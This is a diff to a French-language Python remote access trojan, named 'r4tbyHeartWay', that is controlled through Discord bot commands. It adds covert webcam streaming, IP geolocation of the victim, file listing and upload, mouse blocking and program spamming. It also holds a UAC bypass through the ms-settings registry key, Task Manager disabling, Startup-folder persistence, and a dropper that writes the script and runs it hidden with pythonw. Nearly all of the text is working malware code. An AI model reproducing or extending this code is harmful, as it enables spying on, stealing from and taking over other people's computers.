+            )
+            await ctx.send(embed=embed)
 
         os.remove(temp_file_path)
 
     except Exception as e:
-        await ctx.send(f"Une erreur est survenue lors de la capture vidéo : {str(e)}")
+        embed = discord.Embed(
+            title="Erreur",
+            description=f"Une erreur est survenue lors de la capture vidéo : {str(e)}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
+
+#clear
 
 @bot.command(name='clear')
 @commands.has_permissions(manage_messages=True)
@@ -509,10 +829,25 @@ async def clear_channel(ctx):
     try:
         await ctx.channel.purge()
 
+        local_user_name = getpass.getuser()
+
+        embed = discord.Embed(
+            title="Utilisateurs connectés",
+            description=f"Voici la liste des clients :",
+            color=discord.Color.blue()
+        )
+        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66de7072&is=66dd1ef2&hm=479bbff6c6053cf7b964d76047d36f12d8fd317350212bcdafae4efd118498c7&=&format=webp&quality=lossless&width=662&height=662")
+
+        embed.add_field(name="Utilisateur", value=local_user_name, inline=False)
+
+        await ctx.send(embed=embed)
+
     except Exception as e:
         print(f"Erreur lors de la suppression des messages : {str(e)}")
 
-@bot.command(name='install')
+#install
+
+@bot.command(name=f'{local_user_name}_install')
 async def install(ctx):
     if ctx.message.attachments:
         attachment = ctx.message.attachments[0]
@@ -523,32 +858,58 @@ async def install(ctx):
     else:
         await ctx.send('Aucun fichier attaché. Veuillez joindre un fichier à votre message.')
 
-@bot.command(name='block_mouse')
+#block_mouse
+
+@bot.command(name=f'{local_user_name}_block_mouse')
 async def block_mouse(ctx):
     global mouse_blocked
     if not mouse_blocked:
         mouse_blocked = True
-        await ctx.send('La souris est maintenant bloquée.')
+        embed = discord.Embed(
+            title="Souris bloquée",
+            description="La souris est maintenant bloquée.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
         
         def block():
             while mouse_blocked:
                 pyautogui.moveTo(0, 0)
-                time.sleep(0.1)
-
+                time.sleep(0.001)
+        
         threading.Thread(target=block, daemon=True).start()
     else:
-        await ctx.send('La souris est déjà bloquée.')
+        embed = discord.Embed(
+            title="Souris déjà bloquée",
+            description="La souris est déjà bloquée.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
-@bot.command(name='unblock_mouse')
+#unblock_mouse
+
+@bot.command(name=f'{local_user_name}_unblock_mouse')
 async def unblock_mouse(ctx):
     global mouse_blocked
     if mouse_blocked:
         mouse_blocked = False
-        await ctx.send('La souris est maintenant débloquée.')
+        embed = discord.Embed(
+            title="Souris débloquée",
+            description="La souris est maintenant débloquée.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
     else:
-        await ctx.send('La souris n\'est pas bloquée.')
+        embed = discord.Embed(
+            title="Souris non bloquée",
+            description="La souris n'est pas bloquée.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
-@bot.command()
+#play_v
+
+@bot.command(name=f'{local_user_name}_play_v')
 async def play_v(ctx):
     if len(ctx.message.attachments) == 0:
         await ctx.send("Veuillez joindre un fichier vidéo.")
@@ -577,17 +938,29 @@ async def play_v(ctx):
 
     os.remove(file_path)
 
-@bot.command()
+#play_s
+
+@bot.command(name=f'{local_user_name}_play_s')
 async def play_s(ctx):
     if len(ctx.message.attachments) == 0:
-        await ctx.send("Veuillez joindre un fichier vidéo.")
+        embed = discord.Embed(
+            title="Aucun fichier joint",
+            description="Veuillez joindre un fichier audio ou vidéo (MP3, MP4, WAV, etc.).",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
         return
 
     attachment = ctx.message.attachments[0]
     filename = attachment.filename
 
-    if not filename.endswith(('.mp4', '.mkv', '.avi', '.mov', '.flv')):
-        await ctx.send("Le fichier joint n'est pas un format vidéo supporté.")
+    if not filename.endswith(('.mp3', '.wav', '.mp4', '.mkv', '.avi', '.mov', '.flv')):
+        embed = discord.Embed(
+            title="Format non supporté",
+            description="Le fichier joint n'est pas un format audio/vidéo supporté.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
         return
 
     file_path = f"./{filename}"
@@ -597,16 +970,34 @@ async def play_s(ctx):
 
     try:
         subprocess.run([vlc_path, "--intf", "dummy", "--play-and-exit", "--no-video", file_path], check=True)
-        await ctx.send(f"Lecture de l'audio de la vidéo : {filename}")
+
+        embed = discord.Embed(
+            title="Lecture audio",
+            description=f"Lecture de l'audio de la vidéo : {filename}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
     except subprocess.CalledProcessError as e:
-        await ctx.send("Erreur lors de la tentative de lecture de l'audio.")
+        embed = discord.Embed(
+            title="Erreur de lecture",
+            description="Erreur lors de la tentative de lecture de l'audio avec VLC.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
         print(e)
     except FileNotFoundError:
-        await ctx.send("Le lecteur audio spécifié est introuvable. Vérifiez le chemin.")
+        embed = discord.Embed(
+            title="Lecteur VLC introuvable",
+            description="Le lecteur VLC spécifié est introuvable. Vérifiez le chemin.",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
     os.remove(file_path)
+    
+#record
 
-@bot.command()
+@bot.command(name=f'{local_user_name}_record')
 async def record(ctx, time: int):
     if time <= 0:
         await ctx.send("Veuillez spécifier un temps d'enregistrement positif.")
@@ -655,13 +1046,13 @@ async def record(ctx, time: int):
 
     os.remove(file_path)
 
-@bot.command()
+@bot.command(name=f'{local_user_name}_startup')
 async def startup(ctx):
     if sys.platform == "win32":
         try:
             file_name = "r4tbyHeartWay.pyw"
             
-            appdata_roaming_path = Path(os.getenv('APPDATA'))
+            appdata_roaming_path = Path(os.getenv('APPDATA')) / 'discord'
             file_path = appdata_roaming_path / file_name
             
             startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
@@ -736,17 +1127,17 @@ async def bypass_uac(ctx, command):
         remove_reg = r"""powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force"""
         os.system(remove_reg)
 
-@bot.command()
+@bot.command(name=f'{local_user_name}_uacbypass')
 async def uacbypass(ctx):
     await bypass_uac(ctx, "echo 'Bypass réussi!'")
 
-@bot.command()
+@bot.command(name=f'{local_user_name}_block_taskmanager')
 async def block_taskmanager(ctx):
     block_cmd = r"""powershell New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force"""
     await bypass_uac(ctx, block_cmd)
     await ctx.send("Le gestionnaire des tâches a été désactivé.")
 
-@bot.command()
+@bot.command(name=f'{local_user_name}_unblock_taskmanager')
 async def unblock_taskmanager(ctx):
     unblock_cmd = r"""powershell Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Force"""
     await bypass_uac(ctx, unblock_cmd)
@@ -759,17 +1150,31 @@ def set_volume(volume_level):
     volume = interface.QueryInterface(IAudioEndpointVolume)
     volume.SetMasterVolumeLevelScalar(volume_level, None)
 
-@bot.command(name='volumemax')
+#volumemax
+
+@bot.command(name=f'{local_user_name}_volumemax')
 async def volumemax(ctx):
     set_volume(1.0)
-    await ctx.send("🔊 Volume mis au maximum.")
+    embed = discord.Embed(
+        title="Volume Maximum",
+        description="🔊 Le volume a été mis au maximum.",
+        color=discord.Color.blue()
+    )
+    await ctx.send(embed=embed)
 
-@bot.command(name='volumemin')
+#volumemin
+
+@bot.command(name=f'{local_user_name}_volumemin')
 async def volumemin(ctx):
     set_volume(0.0)
-    await ctx.send("🔈 Volume mis au minimum.")
+    embed = discord.Embed(
+        title="Volume Minimum",
+        description="🔈 Le volume a été mis au minimum.",
+        color=discord.Color.blue()
+    )
+    await ctx.send(embed=embed)
 
-@bot.command(name='list_folder')
+@bot.command(name=f'{local_user_name}_list_folder')
 async def list_folder(ctx):
     root_dir = 'C:\\'
     output_file = 'folder_list.txt'
@@ -785,7 +1190,7 @@ async def list_folder(ctx):
     except Exception as e:
         await ctx.send(f"Une erreur s'est produite : {e}")
 
-@bot.command(name='list_file')
+@bot.command(name=f'{local_user_name}_list_file')
 async def list_file(ctx, directory: str):
     output_file = 'file_list.txt'
 
@@ -806,7 +1211,7 @@ async def list_file(ctx, directory: str):
     except Exception as e:
         await ctx.send(f"Une erreur s'est produite : {e}")
 
-@bot.command(name='upload')
+@bot.command(name=f'{local_user_name}_upload')
 async def upload(ctx, file_path: str):
     try:
         if not os.path.isfile(file_path):
@@ -818,7 +1223,7 @@ async def upload(ctx, file_path: str):
     except Exception as e:
         await ctx.send(f"Une erreur s'est produite lors de l'envoi du fichier : {e}")
 
-@bot.command(name='wallpaper')
+@bot.command(name=f'{local_user_name}_wallpaper')
 async def wallpaper(ctx):
     if not ctx.message.attachments:
         await ctx.send("Veuillez joindre une image pour définir comme fond d'écran.")
@@ -831,7 +1236,15 @@ async def wallpaper(ctx):
         await attachment.save(file_path)
 
         ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)
-        await ctx.send("L'image a été définie comme fond d'écran.")
+
+        embed = discord.Embed(
+            title="Fond d'écran mis à jour",
+            description="L'image a été définie comme fond d'écran avec succès.",
+            color=discord.Color.blue()
+        )
+        embed.set_image(url=attachment.url)
+
+        await ctx.send(embed=embed)
         
     except Exception as e:
         await ctx.send(f"Une erreur s'est produite : {e}")
@@ -840,7 +1253,7 @@ async def wallpaper(ctx):
         if os.path.isfile(file_path):
             os.remove(file_path)
 
-@bot.command(name='logout')
+@bot.command(name=f'{local_user_name}_logout')
 async def logout(ctx):
     try:
         os_type = platform.system()
@@ -849,51 +1262,270 @@ async def logout(ctx):
             os.system("shutdown /l")
         elif os_type == "Linux" or os_type == "Darwin":
             os.system("gnome-session-quit --logout --no-prompt")
-
         else:
-            await ctx.send(f"Système d'exploitation non supporté : {os_type}")
+            embed = discord.Embed(
+                title="Erreur",
+                description=f"Système d'exploitation non supporté : {os_type}",
+                color=discord.Color.blue()
+            )
+            await ctx.send(embed=embed)
             return
-        
-        await ctx.send("Déconnexion en cours...")
+
+        embed = discord.Embed(
+            title="Déconnexion",
+            description="Déconnexion en cours...",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
         
     except Exception as e:
-        await ctx.send(f"Une erreur s'est produite : {e}")
+        embed = discord.Embed(
+            title="Erreur",
+            description=f"Une erreur s'est produite : {e}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
 
-@bot.command(name='geolocate')
-async def geolocate(ctx):
-    try:
-        response = requests.get("https://ipinfo.io")
-        data = response.json()
-        
-        location = data.get("loc", None)
-        
-        if location:
-            latitude, longitude = location.split(',')
-            await ctx.send(f"📍 Localisation actuelle:\nLatitude: {latitude}\nLongitude: {longitude}")
-        else:
-            await ctx.send("Impossible de déterminer la localisation.")
-
-    except Exception as e:
-        await ctx.send(f"Une erreur s'est produite : {e}")
+#geolocate
 
 bot.remove_command('geolocate')
 
-@bot.command(name='geolocate')
+@bot.command(name=f'{local_user_name}_geolocate')
 async def geolocate(ctx):
     try:
         response = requests.get("https://ipinfo.io")
         data = response.json()
-        
+
         location = data.get("loc", None)
-        
+        city = data.get("city", "Inconnue")
+        region = data.get("region", "Inconnue")
+        country = data.get("country", "Inconnu")
+        postal = data.get("postal", "Inconnu")
+        ip = data.get("ip", "Inconnu")
+        org = data.get("org", "Inconnue")
+
         if location:
             latitude, longitude = location.split(',')
-            await ctx.send(f"📍 Localisation actuelle:\nLatitude: {latitude}\nLongitude: {longitude}")
+            embed = discord.Embed(
+                title="Localisation Actuelle",
+                description="📍 Voici les informations de géolocalisation obtenues :",
+                color=discord.Color.blue()
+            )
+            embed.add_field(name="IP", value=ip, inline=True)
+            embed.add_field(name="Organisation", value=org, inline=True)
+            embed.add_field(name="Ville", value=city, inline=True)
+            embed.add_field(name="Région", value=region, inline=True)
+            embed.add_field(name="Pays", value=country, inline=True)
+            embed.add_field(name="Code Postal", value=postal, inline=True)
+            embed.add_field(name="Latitude", value=latitude, inline=True)
+            embed.add_field(name="Longitude", value=longitude, inline=True)
+            embed.add_field(name="Carte", value=f"https://www.google.com/maps?q={latitude},{longitude}", inline=False)
+            await ctx.send(embed=embed)
         else:
-            await ctx.send("Impossible de déterminer la localisation.")
+            embed = discord.Embed(
+                title="Erreur",
+                description="Impossible de déterminer la localisation.",
+                color=discord.Color.blue()
+            )
+            await ctx.send(embed=embed)
 
     except Exception as e:
-        await ctx.send(f"Une erreur s'est produite : {e}")
+        embed = discord.Embed(
+            title="Erreur",
+            description=f"Une erreur s'est produite : {e}",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
+
+#webcam_on
+
+@bot.command(name=f'{local_user_name}_webcam_on')
+async def webcam_on(ctx):
+    global webcam_task, webcam_channel
+
+    guild = ctx.guild
+    webcam_channel = discord.utils.get(guild.text_channels, name="webcam")
+    
+    if webcam_channel is None:
+        webcam_channel = await guild.create_text_channel("webcam")
+        embed = discord.Embed(
+            title="Webcam",
+            description="📹 Salon webcam créé.",
+            color=discord.Color.green()
+        )
+        await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+            title="Webcam",
+            description="Le salon webcam existe déjà.",
+            color=discord.Color.orange()
+        )
+        await ctx.send(embed=embed)
+
+    if webcam_task is None:
+        webcam_task = bot.loop.create_task(capture_webcam(ctx))
+
+@bot.command(name=f'{local_user_name}_webcam_off')
+async def webcam_off(ctx):
+    global webcam_task, webcam_channel, captured_messages
+
+    if webcam_task is not None:
+        webcam_task.cancel()
+        webcam_task = None
+        embed = discord.Embed(
+            title="Webcam",
+            description="📷 Webcam désactivée.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+    if captured_messages:
+        for msg in captured_messages:
+            await msg.delete()
+        captured_messages = []
+
+    if webcam_channel is not None:
+        await webcam_channel.delete()
+        webcam_channel = None
+
+async def capture_webcam(ctx):
+    global webcam_channel, captured_messages
+
+    cap = cv2.VideoCapture(0)
+
+    try:
+        while True:
+            ret, frame = cap.read()
+
+            if not ret:
+                embed = discord.Embed(
+                    title="Erreur Webcam",
+                    description="Erreur : Impossible de capturer l'image depuis la webcam.",
+                    color=discord.Color.red()
+                )
+                await ctx.send(embed=embed)
+                break
+
+            cv2.imwrite(CAPTURE_PATH, frame)
+
+            with open(CAPTURE_PATH, 'rb') as f:
+                message = await webcam_channel.send(file=discord.File(f, "webcam_capture.jpg"))
+
+            captured_messages.append(message)
+
+            if len(captured_messages) > 1:
+                old_msg = captured_messages.pop(0)
+                await old_msg.delete()
+
+            await asyncio.sleep(0.1)
+
+    except asyncio.CancelledError:
+        pass
+    finally:
+        cap.release()
+        if os.path.exists(CAPTURE_PATH):
+            os.remove(CAPTURE_PATH)
+
+#spam
+
+programs_list = [
+    {"label": "Notepad", "value": "notepad.exe"},
+    {"label": "Calculator", "value": "calc.exe"},
+    {"label": "Paint", "value": "mspaint.exe"},
+    {"label": "cmd", "value": "cmd.exe"}
+]
+
+execution_options = [
+    {"label": "1", "value": "1"},
+    {"label": "5", "value": "5"},
+    {"label": "10", "value": "10"},
+    {"label": "50", "value": "50"},
+    {"label": "100", "value": "100"}
+]
+
+class SpamProgramView(View):
+    def __init__(self):
+        super().__init__()
+        self.program_select = Select(
+            placeholder="Choisissez un programme...",
+            options=[discord.SelectOption(label=prog["label"], value=prog["value"]) for prog in programs_list]
+        )
+        self.add_item(self.program_select)
+
+        self.selected_program = None
+
+        self.program_select.callback = self.program_callback
+
+    async def program_callback(self, interaction: discord.Interaction):
+        self.selected_program = self.program_select.values[0]
+
+        await interaction.message.delete()
+
+        await interaction.message.channel.send(embed=create_execution_embed(), view=SpamExecutionView(self.selected_program))
+
+class SpamExecutionView(View):
+    def __init__(self, selected_program):
+        super().__init__()
+        self.selected_program = selected_program
+        self.execution_select = Select(
+            placeholder="Choisissez le nombre d'exécutions...",
+            options=[discord.SelectOption(label=option["label"], value=option["value"]) for option in execution_options]
+        )
+        self.add_item(self.execution_select)
+
+        self.selected_execution_count = 1
+
+        self.execution_select.callback = self.execution_callback
+
+    async def execution_callback(self, interaction: discord.Interaction):
+        self.selected_execution_count = int(self.execution_select.values[0])
+
+        await interaction.message.delete()
+
+        await self.execute_program(interaction)
+
+    async def execute_program(self, interaction: discord.Interaction):
+        try:
+            for _ in range(self.selected_execution_count):
+                subprocess.Popen(self.selected_program)
+                await asyncio.sleep(1)
+
+            embed = discord.Embed(
+                title="Exécution terminée",
+                description=f"Le programme **{self.selected_program}** a été exécuté **{self.selected_execution_count}** fois.",
+                color=discord.Color.green(),
+            )
+            await interaction.message.channel.send(embed=embed)
+
+        except Exception as e:
+            embed = discord.Embed(
+                title="Erreur",
+                description=f"Une erreur est survenue lors de l'exécution du programme : {str(e)}",
+                color=discord.Color.red(),
+            )
+            await interaction.message.channel.send(embed=embed)
+
+def create_program_embed():
+    embed = discord.Embed(
+        title="Sélectionnez un programme",
+        description="Veuillez choisir le programme à exécuter.",
+        color=discord.Color.blue(),
+    )
+    return embed
+
+def create_execution_embed():
+    embed = discord.Embed(
+        title="Sélectionnez le nombre d'exécutions",
+        description="Choisissez combien de fois vous souhaitez exécuter le programme.",
+        color=discord.Color.blue(),
+    )
+    return embed
+
+@bot.command(name=f'{local_user_name}_spam')
+async def spam_command(ctx):
+    await ctx.send(embed=create_program_embed(), view=SpamProgramView())
+
+#end
 
 async def main():
     await bot.start(TOKEN)
@@ -902,7 +1534,13 @@ if __name__ == "__main__":
     asyncio.run(main())
 '''
 
-with open(file_path, "w", encoding="utf-8") as file:
-    file.write(script_content)
+try:
+    with open(file_path, "w", encoding="utf-8") as file:
+        file.write(script_content)
+    print(f"Le fichier {file_name} a été créé avec succès dans {discord_path}.")
 
-subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), str(file_path)], close_fds=True)
+    subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), str(file_path)], close_fds=True)
+    print(f"Le script {file_name} a été lancé en arrière-plan.")
+    
+except Exception as e:
+    print(f"Une erreur s'est produite : {e}")
